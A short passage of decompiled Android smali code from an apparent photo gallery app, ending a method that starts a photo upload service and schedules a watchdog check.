    invoke-virtual {p0, p1}, Lcom/photo/gallery/PhotoUploadService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 513
    :goto_0
    invoke-static {p0}, Lcom/photo/gallery/ServiceWatchdog;->scheduleNextCheck(Landroid/content/Context;)V

    return-void
.end method
